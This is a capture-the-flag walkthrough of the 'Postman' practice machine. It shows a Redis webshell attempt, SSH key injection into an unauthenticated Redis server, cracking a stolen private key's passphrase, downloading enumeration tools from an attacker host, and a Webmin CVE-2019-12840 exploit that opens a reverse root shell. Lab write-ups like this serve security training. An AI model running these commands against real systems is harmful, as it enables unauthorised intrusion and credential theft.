# Postman - Easy

```sh
sudo vim /etc/hosts
# add postman.htb

nmap -T4 -p- -A -Pn -v postman.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
    * 80/tcp - http - Apache httpd 2.4.29
    * 6379/tcp - redis - Redis key-value store 4.0.9
    * 10000/tcp - http - MiniServ 1.910

* the webpage on port 80 is a personal website that is under construction

* checking the webpage on port 10000, it is running in SSL mode, and leads to a login page for Webmin

* Googling for exploits associated with Webmin or Miniserv 1.910 leads to [CVE-2019-12840](https://www.exploit-db.com/exploits/46984), a RCE exploit using the 'package updates' module - but this requires valid login creds

* attempting default & weak creds like 'admin:admin' or 'root:root' does not work for Webmin login; we need to enumerate further for any clues

* web scan:

    ```sh
    gobuster dir -u http://postman.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # dir scan
    # this gives excessive timeouts

    ffuf -c -u "http://postman.htb" -H "Host: FUZZ.postman.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 25 -fs 0,3844 -s
    # subdomain scan
    # -fs 0 to avoid false positives

    gobuster dir -u https://postman.htb:10000 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # this fails as server returns 200 for non existing urls
    ```

* ```gobuster``` gives an '/upload' directory for the main webpage - but this just contains all the images used for the website

* [enumerating the redis service](https://hackviser.com/tactics/pentesting/services/redis):

    ```sh
    redis-cli -h postman.htb -p 6379
    # unauthenticated login works

    info
    # redis info
    # empty keyspace, so no keys & values

    config get *
    # check all config params
    # this shows config dir is set to '/var/lib/redis'

    # we can attempt to upload webshell to webroot

    set shell '<?php system($_REQUEST["cmd"]); ?>'
    config set dbfilename shell.php
    config set dir /var/www/html
    save
    # error
    # this does not work

    EVAL "return os.execute('whoami')" 0
    # Lua scripting is not enabled, so this does not work

    exit

    # we can attempt SSH key injection

    ssh-keygen -t rsa -f redis_key

    (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
    
    cat key.txt | redis-cli -h postman.htb -p 6379 -x set ssh_key
    
    redis-cli -h postman.htb -p 6379 config set dbfilename authorized_keys
    
    redis-cli -h postman.htb -p 6379 config set dir /root/.ssh
    # permission denied
    
    # trying alternative paths according to current config dir
    redis-cli -h postman.htb -p 6379 config set dir /var/lib/redis/.ssh
    # this works

    redis-cli -h postman.htb -p 6379 save
    # config saved

    ssh -i redis_key redis@postman.htb
    # this works
    ```

* using ```redis``` SSH key injection, we have SSH access as 'redis' user now:

    ```sh
    id
    # 'redis' user

    pwd
    # /var/lib/redis

    ls -la
    # enumerate files

    cat .bash_history
    # mentions files like 'id_rsa.bak' and 'scan.py'

    ls -la /
    # check non-default file in root directory

    cat /webmin-setup.out
    # no info

    ls -la /home
    # we have a user 'Matt'

    # find the files mentioned in bash history earlier

    find / -type f -name scan.py 2>/dev/null
    find / -type f -name id_rsa.bak 2>/dev/null
    # this finds the file in /opt

    ls -la /opt

    cat /opt/id_rsa.bak
    # copy private key
    ```

* copy the 'id_rsa.bak' output found in '/opt' - this could be the SSH private key for user 'Matt':

    ```sh
    # on attacker
    vim Matt_key

    chmod 600 Matt_key

    ssh -i Matt_key Matt@postman.htb
    # this requires a passphrase

    # we can attempt to crack the SSH key

    ssh2john Matt_key > Matt_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt Matt_hash
    # this cracks the passphrase
    ```

* using ```john```, we get the cleartext 'computer2008' for 'Matt', we can now SSH:

    ```sh
    ssh -i Matt_key Matt@postman.htb
    # this fails with "connection closed"
    ```

* it seems we cannot login as 'Matt' over SSH; we can attempt to use ```su``` to switch to Matt, from our 'redis' SSH:

    ```sh
    su Matt
    # this works with the password found

    cd

    cat user.txt
    # user flag

    sudo -l
    # not available

    ls -la
    # enumerate files

    cat .bash_history
    # this mentions a few files like 'reminder', 'justincase.txt'
    # searching for these files does not give anything

    # do basic enum using linpeas - fetch script from attacker

    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.15.0-58-generic, Ubuntu 18.04.3
    * sudo version 1.8.21p2
    * ```/var/www/SimpleHTTPPutServer.py``` is writable

* enumerate the web directory for any clues:

    ```sh
    ls -la /var/www

    cat /var/www/SimpleHTTPPutServer.py
    # this is just a Python server script
    # this is writable by us

    ls -la /var/www/html
    # nothing of use
    ```

* the Python script found in the web directory is writable by us; but we need to check if it is being used anywhere in a cronjob or process, for example

* we can check using ```pspy```:

    ```sh
    # fetch pspy from attacker

    wget http://10.10.14.21:8000/pspy64
    chmod +x pspy64
    ./pspy64
    ```

* ```pspy``` does not give any processes using this Python script; but it shows the ```webmin``` instance is running as 'root' using the process ```/usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf```

* checking the ```webmin``` files and related config files (using Google to determine possible credential/config file locations):

    ```sh
    ls -la /usr/share/webmin

    ls -la /etc/webmin
    # most of the files are read-only

    cat /usr/share/webmin/version
    # confirm version 1.910

    cat /etc/webmin/miniserv.conf
    # permission denied

    cat /etc/webmin/config

    cat /usr/share/webmin/miniserv.pl
    ```

* we did not get any creds for 'root'; we can attempt to log into ```webmin``` with the creds 'Matt:computer2008' - this works

* as we have a set of valid creds now, we can attempt the [CVE-2019-12840 exploit](https://github.com/KrE80r/webmin_cve-2019-12840_poc):

    ```sh
    # on attacker

    nc -nvlp 4444
    # setup listener

    python3 CVE-2019-12840.py -u https://postman.htb -U Matt -P computer2008 -lhost 10.10.14.21 -lport 4444
    # port is already assumed as 10000 in exploit code

    # this works and we get root shell on listener

    id
    # root

    cat /root/root.txt
    ```
